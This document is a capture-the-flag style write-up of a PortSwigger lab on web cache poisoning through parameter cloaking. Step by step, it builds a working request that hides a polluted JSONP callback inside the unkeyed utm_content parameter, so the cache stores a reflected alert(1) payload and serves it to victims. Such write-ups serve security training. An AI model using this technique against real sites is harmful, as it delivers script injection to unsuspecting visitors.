# Lab: Parameter Cloaking

## 🎯 Objective



This lab is vulnerable to **web cache poisoning** due to a combination of:



* Parameter pollution

* An unkeyed parameter

* Inconsistent query-string parsing between the front-end cache and the back-end application



The goal is to poison the cache with a response that executes:



```javascript

alert(1)

```



in the victim's browser.



---



## 🧠 Core Concept



The vulnerability exists because the **front-end cache and back-end parse query parameters differently**.



The cache does not include the `utm_content` parameter in its cache key, while the back-end still processes it.



Additionally, the back-end accepts `;` as a valid query-parameter separator, while the cache only recognizes `&`.



This allows us to **cloak a polluted parameter inside an unkeyed parameter**.



---



## 1. Identify the Cache Oracle



The `/geolocate.json` endpoint exposes cache-related information through response headers such as:



```text

X-Cache

Age

Cache-Control

```



By sending the same request multiple times, we can determine whether the response is:



```text

Cache MISS

```



or:



```text

Cache HIT

```



This makes the endpoint a useful **cache oracle**.






---




## 2. Find a Cache Buster



Instead of modifying the query string, we used the `Origin` header as a cache buster:



```http

Origin: https://example.com

```



The first request resulted in:



```text

Cache MISS

```



Repeating the same request resulted in:



```text

Cache HIT

```



Changing the `Origin` value caused another cache miss.



This allows us to perform testing without constantly changing the query string.



---



## 3. Identify the XSS Injection Point



The `callback` parameter is reflected in the response.



For example:



```http

GET /geolocate.json?callback=alert(1)

```



The response reflects:



```text

alert(1)

```



This gives us an XSS injection point.


However, `callback` is part of the cache key, so simply poisoning the cache with:



```text

callback=alert(1)

```



would only affect users requesting the exact same parameter value.



---



## 4. Parameter Pollution



We then supplied the `callback` parameter twice:



```http

GET /geolocate.json?callback=setCountryCookie&callback=alert(1)

```





The back-end application gives precedence to the second parameter:



```text

callback=alert(1)

```



This confirms **parameter pollution**.



However, both parameters are still visible to the cache, so changing the malicious callback value causes a new cache 
entry.




---



## 5. Find an Unkeyed Parameter



We used:



```text

Param Miner → Guess GET parameters

```



Param Miner identified:



```text

utm_content

```



as an **unkeyed input**.



An unkeyed parameter affects the application's response but is not included in the cache key.



Therefore, changes to `utm_content` do not create a separate cache entry.




---




## 6. Parameter Cloaking



First, we placed the unkeyed parameter between the two polluted parameters:



```http

GET /geolocate.json?callback=setCountryCookie&utm_content=foo&callback=alert(1)


```



The problem is that the cache still sees:



```text

callback=alert(1)

```



as a separate parameter.



We therefore changed the separator from:



```text

&

```



to:



```text

;

```



Result:



```http

GET /geolocate.json?callback=setCountryCookie&utm_content=foo;callback=alert(1)

```



### What the cache sees



The front-end cache treats `&` as the parameter separator:



```text

callback=setCountryCookie


utm_content=foo;callback=alert(1)

```



Therefore, the malicious:






```text


callback=alert(1)

```


is interpreted as part of the `utm_content` value.



Since `utm_content` is unkeyed, this part is excluded from the cache key.




---



### What the back-end sees



The back-end accepts `;` as a parameter separator, so it parses the request as:



```text

callback=setCountryCookie

utm_content=foo

callback=alert(1)


```





Because of parameter pollution, the second `callback` takes precedence:



```text

callback=alert(1)

```



---



## 7. Poison the Cache



The resulting payload is:



```http

GET /geolocate.json?callback=setCountryCookie&utm_content=foo;callback=alert(1)

```



The first request produces a:




```text

Cache MISS

```



After requesting it again, we get:



```text

Cache HIT

```



while the response still contains the malicious callback.



To verify that the polluted parameter is hidden from the cache key, we changed:


```text

alert(1)

```



to:




```text

alert(2)

```



The response remained a:



```text

Cache HIT

```



This confirmed that the cache was effectively treating the polluted callback as part of the unkeyed `utm_content` 
parameter.



---



## 8. Final Exploit



We removed the cache buster and restored the payload to:



```javascript

alert(1)

```



Final request:



```http

GET /geolocate.json?callback=setCountryCookie&utm_content=foo;callback=alert(1)

```



The poisoned response was cached, and when the victim requested the affected resource, the XSS payload was delivered.



**Lab solved ✅**



---



## 🔗 Attack Chain



```text

Reflected XSS

      ↓

Parameter Pollution

      ↓

Unkeyed Parameter: utm_content

      ↓

Parameter Cloaking

      ↓

Hide polluted parameter from cache key

      ↓

Cache Poisoning

      ↓

Victim receives poisoned response

      ↓

alert(1)

```



---


## 💡 Key Takeaways



* **Parameter pollution** can become much more powerful when combined with cache poisoning.

* **Unkeyed parameters** can be abused to hide malicious input from the cache key.

* **Parameter cloaking** relies on inconsistent parameter parsing between different components.

* A cache and a back-end can interpret the **same query string differently**.

* When investigating web cache poisoning, always look for differences in how query parameters are parsed and keyed.



### References



* PortSwigger Web Security Academy — Web Cache Poisoning

* PortSwigger Web Security Academy — Parameter Cloaking
